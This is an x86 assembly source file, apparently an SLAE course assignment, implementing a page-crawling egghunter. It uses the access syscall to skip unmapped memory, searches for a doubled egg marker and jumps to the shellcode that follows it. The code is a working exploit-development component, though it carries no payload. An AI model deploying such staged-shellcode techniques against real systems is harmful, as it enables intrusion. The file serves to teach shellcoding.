; Filename: page_crawling_egghunter.nasm
; Author:  Slumber
;
; Purpose: SLAEx86 Assignment 3

global _start			

section .text

_start:
	cld			; to clear the direction flag due to scasd instruction
	xor eax, eax		; to zero out eax for sys_call
	xor ecx, ecx		; to zero out ecx for sys_call
	cdq			; to zero out edx for bitwise operation

next_page:
	or dx, 0xfff		; to add 4095 to edx

next_slot:
	inc edx			; to add 1 to edx

check_page:
	push byte 0x21		; 0x21 = SYS_ACCESS
	pop eax
	lea ebx, [edx+4]	; to check if [edx+4] can be accessed
	int 0x80		; SYSTEM_CALL

	cmp al, 0xf2		; 0xf2 = EFAULT = access denied
	je next_page		; if EFAULT, go to next 4096 bytes page

search_egg:
	mov eax, 0x41904990	; EGG = INC ecx, NOP, DEC ecx, NOP
	mov edi, edx
	scasd			; to compare if eax == edi, then INC edi by 4 bytes
	jnz next_slot
	scasd			; to compare if eax == edx+4, then INC edi by 4 bytes
	jnz next_slot

	jmp edi			; EGG is found, to jmp to the payload directly instead of egg mark
